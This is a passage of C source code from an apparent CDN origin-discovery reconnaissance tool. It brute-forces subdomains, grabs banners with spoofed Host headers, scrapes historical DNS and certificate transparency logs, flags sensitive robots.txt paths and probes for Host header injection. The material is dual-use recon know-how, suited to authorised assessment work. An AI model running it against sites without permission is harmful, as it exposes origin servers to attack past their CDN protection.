                                        strncmp(cleaned, "172.21.", 7) == 0 ||
                                        strncmp(cleaned, "172.22.", 7) == 0 ||
                                        strncmp(cleaned, "172.23.", 7) == 0 ||
                                        strncmp(cleaned, "172.24.", 7) == 0 ||
                                        strncmp(cleaned, "172.25.", 7) == 0 ||
                                        strncmp(cleaned, "172.26.", 7) == 0 ||
                                        strncmp(cleaned, "172.27.", 7) == 0 ||
                                        strncmp(cleaned, "172.28.", 7) == 0 ||
                                        strncmp(cleaned, "172.29.", 7) == 0 ||
                                        strncmp(cleaned, "172.30.", 7) == 0 ||
                                        strncmp(cleaned, "172.31.", 7) == 0 ||
                                        strcmp(cleaned, "127.0.0.1") == 0 ||
                                        strcmp(cleaned, "0.0.0.0") == 0 ||
                                        strcmp(cleaned, "255.255.255.255") == 0) {
                                        valid = 0;
                                    }
                                    
                                    // Skip common test IPs
                                    if (strcmp(cleaned, "1.1.1.1") == 0 ||
                                        strcmp(cleaned, "8.8.8.8") == 0 ||
                                        strcmp(cleaned, "1.2.1.1") == 0 ||
                                        strcmp(cleaned, "1.0.1.1") == 0) {
                                        valid = 0;
                                    }
                                    
                                    if (valid) {
                                        // Check for duplicates
                                        int duplicate = 0;
                                        for (int k = 0; k < *ip_count; k++) {
                                            if (ips[k] && strcmp(ips[k], cleaned) == 0) {
                                                duplicate = 1;
                                                break;
                                            }
                                        }
                                        
                                        if (!duplicate && *ip_count < 50) {
                                            ips[*ip_count] = strdup(cleaned);
                                            if (ips[*ip_count]) {
                                                (*ip_count)++;
                                            }
                                        }
                                    }
                                }
                            }
                            
                            cell_start = content_end + 5; // Move past </td>
                        }
                        
                        row_start = row_end + 5; // Move past </tr>
                    }
                }
            }
        }
        
        if (*ip_count == 0) {
            // Fallback: try to find IPs in the entire page (but with better validation)
            ptr = res.data;
            while (*ptr && *ip_count < 50) {
                // Look for patterns that look like IP addresses in table contexts
                if (isdigit(*ptr)) {
                    char ip[INET_ADDRSTRLEN] = {0};
                    int i = 0;
                    int dots = 0;
                    
                    char *start = ptr;
                    while (*ptr && (isdigit(*ptr) || *ptr == '.') && i < INET_ADDRSTRLEN - 1) {
                        if (*ptr == '.') dots++;
                        ip[i++] = *ptr++;
                    }
                    ip[i] = '\0';
                    
                    // Only accept if it has exactly 3 dots and is a valid IP
                    if (dots == 3 && is_valid_ip(ip) && !is_cdn_ip(ip)) {
                        // Additional context check: look for table tags nearby
                        char *context_start = (start - 50 > res.data) ? start - 50 : res.data;
                        char context[101];
                        strncpy(context, context_start, 100);
                        context[100] = '\0';
                        
                        // Only accept if it appears to be in a table cell
                        if (strstr(context, "<td") || strstr(context, "<tr") || 
                            strstr(context, "table") || strstr(ip, "1.2.1.1") == NULL) {
                            
                            // Skip the problematic IPs
                            if (strcmp(ip, "1.2.1.1") != 0 && strcmp(ip, "1.0.1.1") != 0) {
                                int duplicate = 0;
                                for (int j = 0; j < *ip_count; j++) {
                                    if (ips[j] && strcmp(ips[j], ip) == 0) {
                                        duplicate = 1;
                                        break;
                                    }
                                }
                                
                                if (!duplicate) {
                                    ips[*ip_count] = strdup(ip);
                                    if (ips[*ip_count]) {
                                        (*ip_count)++;
                                    }
                                }
                            }
                        }
                    }
                } else {
                    ptr++;
                }
            }
        }
    }
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    if (res.data) free(res.data);
}

// ================================================================
// ORIGINAL METHODS (1-20) - NATIVE VERSIONS
// ================================================================

void cname_recursion(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("CNAME RECURSION ANALYSIS");
    
    const char *subs[] = {"", "www", "mail", "api", "admin"};
    
    for(int sub = 0; sub < 5; sub++) {
        char test_domain[256];
        if(strlen(subs[sub]) == 0) snprintf(test_domain, sizeof(test_domain), "%s", domain);
        else snprintf(test_domain, sizeof(test_domain), "%s.%s", subs[sub], domain);
        
        char ip[INET_ADDRSTRLEN] = {0};
        native_dns_query(test_domain, "A", ip, sizeof(ip));
        
        if (strlen(ip) > 0 && is_valid_ip(ip)) {
            print_info(test_domain);
            printf("      \033[1;37m→ IP: \033[1;33m%s\033[0m\n", ip);
            
            if (!is_cdn_ip(ip)) {
                print_success("Non-CDN IP discovered");
                log_result("CNAME_LEAK", ip, "CNAME", 85);
            }
        }
    }
}

void banner_grab_and_verify(const char *ip, const char *domain) {
    if (!is_valid_ip(ip) || !sanitize_input(domain)) return;
    
    print_method_header("SERVER BANNER GRABBING");
    
    CURL *curl = curl_easy_init();
    if(!curl) return;
    
    HttpResponse res = {0};
    struct curl_slist *headers = NULL;
    char url[256], host_h[256];
    
    snprintf(url, sizeof(url), "http://%s", ip);
    snprintf(host_h, sizeof(host_h), "Host: %s", domain);
    headers = curl_slist_append(headers, host_h);
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_HEADER, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 3L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
    curl_easy_setopt(curl, CURLOPT_NOBODY, 0L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
    
    CURLcode result = curl_easy_perform(curl);
    if(result == CURLE_OK && res.data) {
        long response_code;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        
        char *srv = strstr(res.data, "Server:");
        if(srv) {
            char banner[128] = {0};
            srv += 7;
            while(*srv == ' ') srv++;
            int i = 0;
            while(*srv != '\r' && *srv != '\n' && i < 127) banner[i++] = *srv++;
            banner[i] = 0;
            
            if(strlen(banner) > 0) {
                printf("    \033[1;37mServer: \033[1;36m%s \033[1;37m| Status: \033[1;33m%ld\033[0m\n", banner, response_code);
                
                if(!strstr(banner, "cloudflare") && !strstr(banner, "akamai") && 
                   !strstr(banner, "fastly") && !strstr(banner, "cloudfront")) {
                    log_result_extended("BANNER", ip, "Banner Grab", 75, banner, NULL, NULL);
                }
            }
        }
    }
    
    free(res.data);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}

void whois_correlation_native(const char *ip, const char *domain) {
    if (!is_valid_ip(ip) || !sanitize_input(domain)) return;
    
    print_method_header("WHOIS CORRELATION ANALYSIS");
    
    // Simple WHOIS using HTTP API (no external whois command)
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    char url[256];
    snprintf(url, sizeof(url), "http://ip-api.com/json/%s", ip);
    
    HttpResponse res = {0};
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
    
    if (curl_easy_perform(curl) == CURLE_OK && res.data) {
        // Parse JSON response (simple parsing)
        char *org = strstr(res.data, "\"org\":\"");
        if (org) {
            org += 7;
            char *end = strstr(org, "\"");
            if (end) {
                char org_name[256] = {0};
                size_t len = end - org;
                if (len < 255) {
                    strncpy(org_name, org, len);
                    org_name[len] = '\0';
                    
                    printf("    \033[1;37mOrganization: \033[1;36m%s\033[0m\n", org_name);
                    
                    if (!strstr(org_name, "Cloudflare") && !strstr(org_name, "Akamai") && 
                        !strstr(org_name, "Amazon") && !strstr(org_name, "Google")) {
                        log_result_extended("WHOIS", ip, "WHOIS", 70, NULL, org_name, NULL);
                    }
                }
            }
        }
    }
    
    curl_easy_cleanup(curl);
    if (res.data) free(res.data);
}

void ssl_certificate_scan_native(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("SSL CERTIFICATE SAN ANALYSIS");
    
    X509 *cert = get_ssl_certificate_native(domain, 443);
    if (!cert) {
        print_error("Could not retrieve SSL certificate");
        return;
    }
    
    // Get SANs
    int san_count = 0;
    char **sans = get_certificate_sans(cert, &san_count);
    
    if (sans && san_count > 0) {
        print_success("Certificate SANs discovered");
        for (int i = 0; i < san_count; i++) {
            printf("      \033[1;37m• \033[1;36m%s\033[0m\n", sans[i]);
            
            // Check if SAN contains an IP address
            if (is_valid_ip(sans[i]) && !is_cdn_ip(sans[i])) {
                printf("      \033[1;32m[+] IP in certificate: \033[1;33m%s\033[0m\n", sans[i]);
                log_result("SSL_CERT_IP", sans[i], "SSL Certificate", 80);
            }
        }
        free_string_array(sans, san_count);
    } else {
        print_error("No SANs found in certificate");
    }
    
    X509_free(cert);
}

void ssl_serial_number_search_native(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("SSL SERIAL NUMBER ANALYSIS");
    
    X509 *cert = get_ssl_certificate_native(domain, 443);
    if (!cert) {
        print_error("Could not retrieve SSL certificate");
        return;
    }
    
    char serial[256] = {0};
    char subject[256] = {0};
    char issuer[256] = {0};
    
    extract_certificate_info(cert, subject, sizeof(subject), 
                            issuer, sizeof(issuer), serial, sizeof(serial));
    
    if (strlen(serial) > 0) {
        printf("    \033[1;37mSSL Serial: \033[1;33m%s\033[0m\n", serial);
        printf("    \033[1;37mSubject: \033[1;36m%s\033[0m\n", subject);
        printf("    \033[1;37mIssuer: \033[1;36m%s\033[0m\n", issuer);
        
        // Note: In a full implementation, you would search crt.sh
        // with this serial number via HTTP API
    }
    
    X509_free(cert);
}

void check_ipv6_leak(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("IPv6 LEAK DETECTION");
    
    char ipv6[INET6_ADDRSTRLEN] = {0};
    native_dns_query(domain, "AAAA", ipv6, sizeof(ipv6));
    
    if(strlen(ipv6) > 0 && is_valid_ip(ipv6)) {
        print_success("IPv6 address discovered");
        printf("      \033[1;37mIPv6: \033[1;33m%s\033[0m\n", ipv6);
        
        if(!is_cdn_ip(ipv6)) {
            printf("      \033[1;32m[+] Non-CDN IPv6 address!\033[0m\n");
            log_result("IPV6_LEAK", ipv6, "IPv6", 85);
        } else {
            print_warning("IPv6 appears to be CDN");
        }
    } else {
        print_error("No IPv6 address found");
    }
}

void try_zone_transfer_native(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("DNS ZONE TRANSFER (AXFR)");
    
    // Zone transfer requires specific DNS server interaction
    // This is a simplified version that tries common techniques
    print_info("Zone transfer attempt initiated");
    
    // Try to get NS records via DNS
    char ns_domain[256];
    snprintf(ns_domain, sizeof(ns_domain), "ns1.%s", domain);
    
    char ns_ip[INET_ADDRSTRLEN] = {0};
    native_dns_query(ns_domain, "A", ns_ip, sizeof(ns_ip));
    
    if (strlen(ns_ip) > 0) {
        printf("    \033[1;37mNameserver IP: \033[1;33m%s\033[0m\n", ns_ip);
    }
}

void *subdomain_worker(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    char fqdn[256];
    snprintf(fqdn, sizeof(fqdn), "%s.%s", data->subdomain, data->domain);
    
    char ip[INET_ADDRSTRLEN] = {0};
    native_dns_query(fqdn, "A", ip, sizeof(ip));
    
    if (is_valid_ip(ip) && !is_cdn_ip(ip)) {
        pthread_mutex_lock(&log_mutex);
        printf("      \033[1;37m• \033[1;36m%s \033[1;37m→ \033[1;33m%s\033[0m\n", fqdn, ip);
        pthread_mutex_unlock(&log_mutex);
        
        log_result("DNS_BRUTE", ip, fqdn, 65);
    }
    
    free(data);
    return NULL;
}

void dns_bruteforce(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("DNS BRUTEFORCE SUBDOMAINS");
    
    pthread_t threads[COMMON_SUBDOMAINS_COUNT];
    int thread_count = 0;
    
    for(int i = 0; i < COMMON_SUBDOMAINS_COUNT; i++) {
        ThreadData *data = malloc(sizeof(ThreadData));
        if(!data) continue;
        
        strncpy(data->subdomain, COMMON_SUBDOMAINS[i], 63);
        data->subdomain[63] = 0;
        strncpy(data->domain, domain, 127);
        data->domain[127] = 0;
        
        if(pthread_create(&threads[thread_count], NULL, subdomain_worker, data) == 0) {
            thread_count++;
            
            if(thread_count >= MAX_THREADS) {
                for(int j = 0; j < thread_count; j++) {
                    pthread_join(threads[j], NULL);
                }
                thread_count = 0;
            }
        } else {
            free(data);
        }
    }
    
    for(int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    print_success("DNS bruteforce completed");
}

void check_mx_records(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("MX RECORD CORRELATION");
    
    // For MX records, we'd need a full DNS resolver
    // Simplified approach using common patterns
    char mx_domain[256];
    snprintf(mx_domain, sizeof(mx_domain), "mail.%s", domain);
    
    char mx_ip[INET_ADDRSTRLEN] = {0};
    native_dns_query(mx_domain, "A", mx_ip, sizeof(mx_ip));
    
    if(strlen(mx_ip) > 0 && is_valid_ip(mx_ip) && !is_cdn_ip(mx_ip)) {
        printf("    \033[1;37mMX Server: \033[1;36m%s \033[1;37m→ \033[1;33m%s\033[0m\n", mx_domain, mx_ip);
        log_result("MX_RECORD", mx_ip, "MX Record", 70);
    }
}

void check_historical_dns_native(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("HISTORICAL DNS ANALYSIS");
    
    char *ips[50];
    int ip_count = 0;
    
    scrape_viewdns_info(domain, ips, &ip_count);
    
    if(ip_count > 0) {
        print_success("Historical IPs discovered");
        for(int i = 0; i < ip_count; i++) {
            printf("      \033[1;37m• \033[1;33m%s\033[0m\n", ips[i]);
            log_result("HISTORICAL_DNS", ips[i], "Historical DNS", 60);
            free(ips[i]);
        }
    } else {
        print_error("No historical IPs found");
    }
}

void check_crt_sh_native(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("CERTIFICATE TRANSPARENCY (crt.sh)");
    
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    char url[256];
    snprintf(url, sizeof(url), "https://crt.sh/?q=%%25.%s&output=json", domain);
    
    HttpResponse res = {0};
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
    
    if(curl_easy_perform(curl) == CURLE_OK && res.data) {
        JsonArray json_result = parse_crt_sh_json(res.data);
        
        for(int i = 0; i < json_result.count; i++) {
            // Skip wildcards
            if(strstr(json_result.items[i], "*")) continue;
            
            printf("    \033[1;37mSubdomain: \033[1;36m%s\033[0m\n", json_result.items[i]);
            
            char ip[INET_ADDRSTRLEN] = {0};
            native_dns_query(json_result.items[i], "A", ip, sizeof(ip));
            
            if(strlen(ip) > 0 && is_valid_ip(ip) && !is_cdn_ip(ip)) {
                printf("      \033[1;32m[+] IP: \033[1;33m%s\033[0m\n", ip);
                log_result("CRT_SH", ip, json_result.items[i], 75);
            }
        }
        
        free_json_array(&json_result);
    } else {
        print_error("Could not retrieve data from crt.sh");
    }
    
    curl_easy_cleanup(curl);
    if(res.data) free(res.data);
}

void check_dns_records(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("COMPREHENSIVE DNS RECORDS");
    
    // Check A record
    char a_record[256] = {0};
    native_dns_query(domain, "A", a_record, sizeof(a_record));
    
    if(strlen(a_record) > 0) {
        printf("    \033[1;37mA Record: \033[1;36m%s \033[1;37m→ \033[1;33m%s\033[0m\n", domain, a_record);
        
        if(is_valid_ip(a_record) && !is_cdn_ip(a_record)) {
            log_result("DNS_A_RECORD", a_record, "DNS A Record", 70);
        }
    }
    
    // Check AAAA record
    char aaaa_record[256] = {0};
    native_dns_query(domain, "AAAA", aaaa_record, sizeof(aaaa_record));
    
    if(strlen(aaaa_record) > 0) {
        printf("    \033[1;37mAAAA Record: \033[1;36m%s \033[1;37m→ \033[1;33m%s\033[0m\n", domain, aaaa_record);
        
        if(is_valid_ip(aaaa_record) && !is_cdn_ip(aaaa_record)) {
            log_result("DNS_AAAA_RECORD", aaaa_record, "DNS AAAA Record", 70);
        }
    }
}

void check_http_redirects(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("HTTP REDIRECT ANALYSIS");
    
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    char url[256];
    snprintf(url, sizeof(url), "http://%s", domain);
    
    HttpResponse res = {0};
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L); // Don't follow redirects automatically
    curl_easy_setopt(curl, CURLOPT_HEADER, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
    
    if (curl_easy_perform(curl) == CURLE_OK && res.data) {
        long response_code;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        
        // Check for redirect
        if (response_code == 301 || response_code == 302 || response_code == 307) {
            char *location = strstr(res.data, "Location:");
            if (location) {
                location += 9;
                while (*location == ' ') location++;
                char *end = strstr(location, "\r\n");
                if (end) {
                    char redirect_url[256] = {0};
                    size_t len = end - location;
                    if (len < 255) {
                        strncpy(redirect_url, location, len);
                        redirect_url[len] = '\0';
                        printf("    \033[1;37mRedirect: \033[1;36m%s \033[1;37m→ \033[1;33m%s\033[0m\n", url, redirect_url);
                        
                        // Extract host from redirect URL
                        if (strstr(redirect_url, "://")) {
                            char *host_start = strstr(redirect_url, "://") + 3;
                            char *host_end = strchr(host_start, '/');
                            if (host_end) *host_end = '\0';
                            
                            // Check if redirect goes to a different IP
                            char redirect_ip[INET_ADDRSTRLEN] = {0};
                            native_dns_query(host_start, "A", redirect_ip, sizeof(redirect_ip));
                            
                            if (strlen(redirect_ip) > 0 && !is_cdn_ip(redirect_ip)) {
                                log_result("HTTP_REDIRECT", redirect_ip, "HTTP Redirect", 75);
                            }
                        }
                    }
                }
            }
        }
    }
    
    curl_easy_cleanup(curl);
    if (res.data) free(res.data);
}

void check_x_headers(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("X-HEADER ANALYSIS");
    
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    char url[256];
    snprintf(url, sizeof(url), "http://%s", domain);
    
    HttpResponse res = {0};
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_easy_setopt(curl, CURLOPT_HEADER, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L); // HEAD request
    
    if (curl_easy_perform(curl) == CURLE_OK && res.data) {
        // Check for various X-headers that might leak info
        const char *suspicious_headers[] = {
            "X-Backend-Server",
            "X-Server",
            "X-Real-IP",
            "X-Forwarded-Server",
            "X-Origin",
            "X-Served-By",
            "X-Host",
            "X-Upstream"
        };
        
        for (int i = 0; i < 8; i++) {
            char *header = strstr(res.data, suspicious_headers[i]);
            if (header) {
                printf("    \033[1;32m[+] Suspicious header: \033[1;36m%s\033[0m\n", suspicious_headers[i]);
                
                // Extract the value
                header += strlen(suspicious_headers[i]) + 1;
                while (*header == ' ') header++;
                char *end = strstr(header, "\r\n");
                if (end) {
                    char value[128] = {0};
                    size_t len = end - header;
                    if (len < 127) {
                        strncpy(value, header, len);
                        value[len] = '\0';
                        printf("      \033[1;37mValue: \033[1;33m%s\033[0m\n", value);
                        
                        // Check if it's an IP address
                        if (is_valid_ip(value) && !is_cdn_ip(value)) {
                            log_result_extended("X_HEADER_LEAK", value, "X-Header", 80, 
                                              suspicious_headers[i], NULL, NULL);
                        }
                    }
                }
            }
        }
    }
    
    curl_easy_cleanup(curl);
    if (res.data) free(res.data);
}

void check_robots_txt(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("ROBOTS.TXT ANALYSIS");
    
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    char url[256];
    snprintf(url, sizeof(url), "http://%s/robots.txt", domain);
    
    HttpResponse res = {0};
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
    
    if (curl_easy_perform(curl) == CURLE_OK && res.data) {
        long response_code;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        
        if (response_code == 200) {
            print_success("robots.txt found");
            
            // Look for disallowed paths that might reveal info
            char *ptr = res.data;
            while (*ptr) {
                if (strncmp(ptr, "Disallow:", 9) == 0) {
                    ptr += 9;
                    while (*ptr == ' ') ptr++;
                    char *end = strchr(ptr, '\n');
                    if (end) {
                        char path[256] = {0};
                        size_t len = end - ptr;
                        if (len < 255) {
                            strncpy(path, ptr, len);
                            path[len] = '\0';
                            
                            // Check if path reveals sensitive info
                            const char *sensitive_paths[] = {
                                "/admin", "/config", "/backup", "/database",
                                "/sql", "/phpmyadmin", "/wp-admin", "/server-status",
                                "/cgi-bin", "/private", "/secret"
                            };
                            
                            for (int i = 0; i < 11; i++) {
                                if (strstr(path, sensitive_paths[i])) {
                                    printf("      \033[1;33m⚠ Sensitive path: \033[1;31m%s\033[0m\n", path);
                                    break;
                                }
                            }
                        }
                    }
                }
                ptr++;
            }
        } else {
            print_error("robots.txt not found");
        }
    }
    
    curl_easy_cleanup(curl);
    if (res.data) free(res.data);
}

void check_sitemap_xml(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("SITEMAP ANALYSIS");
    
    const char *sitemap_paths[] = {
        "/sitemap.xml",
        "/sitemap_index.xml",
        "/sitemap.gz",
        "/sitemap.xml.gz"
    };
    
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    for (int i = 0; i < 4; i++) {
        char url[256];
        snprintf(url, sizeof(url), "http://%s%s", domain, sitemap_paths[i]);
        
        HttpResponse res = {0};
        
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L); // HEAD request first
        
        if (curl_easy_perform(curl) == CURLE_OK) {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            
            if (response_code == 200) {
                print_success("Sitemap found");
                printf("      \033[1;37mPath: \033[1;36m%s\033[0m\n", sitemap_paths[i]);
                
                // If it's a sitemap, do a full GET to check for subdomains
                if (i < 2) { // XML sitemaps
                    curl_easy_setopt(curl, CURLOPT_NOBODY, 0L);
                    if (curl_easy_perform(curl) == CURLE_OK && res.data) {
                        // Simple check for subdomains in URLs
                        char *ptr = res.data;
                        while (*ptr && (ptr = strstr(ptr, "http://"))) {
                            ptr += 7;
                            char *end = strchr(ptr, '/');
                            if (end) {
                                char host[256] = {0};
                                size_t len = end - ptr;
                                if (len < 255) {
                                    strncpy(host, ptr, len);
                                    host[len] = '\0';
                                    
                                    // Check if it's a different host than the main domain
                                    if (strstr(host, domain) && strcmp(host, domain) != 0) {
                                        printf("      \033[1;37m• Subdomain: \033[1;36m%s\033[0m\n", host);
                                        
                                        // Resolve it
                                        char ip[INET_ADDRSTRLEN] = {0};
                                        native_dns_query(host, "A", ip, sizeof(ip));
                                        
                                        if (strlen(ip) > 0 && !is_cdn_ip(ip)) {
                                            log_result("SITEMAP_SUBDOMAIN", ip, "Sitemap", 75);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                break;
            }
        }
        
        if (res.data) free(res.data);
    }
    
    curl_easy_cleanup(curl);
}

void check_crossdomain_xml(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("CROSSDOMAIN.XML ANALYSIS");
    
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    char url[256];
    snprintf(url, sizeof(url), "http://%s/crossdomain.xml", domain);
    
    HttpResponse res = {0};
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
    
    if (curl_easy_perform(curl) == CURLE_OK && res.data) {
        long response_code;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        
        if (response_code == 200) {
            print_success("crossdomain.xml found");
            
            // Check for domain wildcards that might be too permissive
            if (strstr(res.data, "domain=\"*\"")) {
                printf("      \033[1;33m⚠ WARNING: crossdomain.xml allows access from any domain (*)\033[0m\n");
            }
            
            // Look for specific domains/IPs
            char *ptr = res.data;
            while ((ptr = strstr(ptr, "domain=\""))) {
                ptr += 8;
                char *end = strchr(ptr, '"');
                if (end) {
                    char allowed_domain[256] = {0};
                    size_t len = end - ptr;
                    if (len < 255) {
                        strncpy(allowed_domain, ptr, len);
                        allowed_domain[len] = '\0';
                        
                        printf("      \033[1;37m• Allowed domain: \033[1;36m%s\033[0m\n", allowed_domain);
                        
                        // Check if it's an IP address
                        if (is_valid_ip(allowed_domain) && !is_cdn_ip(allowed_domain)) {
                            log_result("CROSSDOMAIN_IP", allowed_domain, "crossdomain.xml", 70);
                        }
                    }
                }
            }
        } else {
            print_error("crossdomain.xml not found");
        }
    }
    
    curl_easy_cleanup(curl);
    if (res.data) free(res.data);
}

void check_host_header_injection(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("HOST HEADER INJECTION TEST");
    
    // First, get the main IP
    char main_ip[INET_ADDRSTRLEN] = {0};
    native_dns_query(domain, "A", main_ip, sizeof(main_ip));
    
    if (strlen(main_ip) == 0 || !is_valid_ip(main_ip)) {
        print_error("Could not resolve domain");
        return;
    }
    
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    // Test with different Host headers
    const char *test_hosts[] = {
        "localhost",
        "127.0.0.1",
        "localhost:80",
        "127.0.0.1:8080"
    };
    
    for (int i = 0; i < 4; i++) {
        char url[256];
        snprintf(url, sizeof(url), "http://%s", main_ip);
        
        HttpResponse res = {0};
        struct curl_slist *headers = NULL;
        char host_header[256];
        snprintf(host_header, sizeof(host_header), "Host: %s", test_hosts[i]);
        headers = curl_slist_append(headers, host_header);
        
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 3L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L); // HEAD request
        
        if (curl_easy_perform(curl) == CURLE_OK) {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            
            if (response_code == 200 || response_code == 301 || response_code == 302) {
                printf("      \033[1;33m⚠ Host header injection possible: \033[1;36m%s \033[1;37m(HTTP \033[1;33m%ld\033[1;37m)\033[0m\n", 
                       test_hosts[i], response_code);
                
                // If localhost works, this might be direct access to origin
                if (strstr(test_hosts[i], "localhost") || strstr(test_hosts[i], "127.0.0.1")) {
                    printf("      \033[1;32m[+] Possible origin server accepting localhost Host header\033[0m\n");
                    log_result_extended("HOST_INJECTION", main_ip, "Host Header Injection", 85, 
                                      test_hosts[i], NULL, "Accepts localhost Host header");
                }
            }
        }
        
        curl_slist_free_all(headers);
        if (res.data) free(res.data);
    }
    
    curl_easy_cleanup(curl);
}

void check_public_ip(const char *domain) {
    if (!sanitize_input(domain)) return;
    
    print_method_header("PUBLIC IP COMPARISON");
    
    // Get public IP of the system
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    char url[] = "https://api.ipify.org";
    HttpResponse res = {0};
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
    
    if (curl_easy_perform(curl) == CURLE_OK && res.data) {
        printf("    \033[1;37mYour public IP: \033[1;33m%s\033[0m\n", res.data);
        
        // Get domain IP
        char domain_ip[INET_ADDRSTRLEN] = {0};
        native_dns_query(domain, "A", domain_ip, sizeof(domain_ip));
        
        if (strlen(domain_ip) > 0) {
            printf("    \033[1;37mDomain IP: \033[1;33m%s\033[0m\n", domain_ip);
            
            // Check if they're the same (self-hosted)
            if (strcmp(res.data, domain_ip) == 0) {
                printf("    \033[1;32m🔥 Domain appears to be hosted on your public IP!\033[0m\n");
                printf("      \033[1;37mThis could mean:\033[0m\n");
                printf("      \033[1;37m1. The site is self-hosted (origin)\033[0m\n");
                printf("      \033[1;37m2. You're accessing the site through a VPN/proxy\033[0m\n");
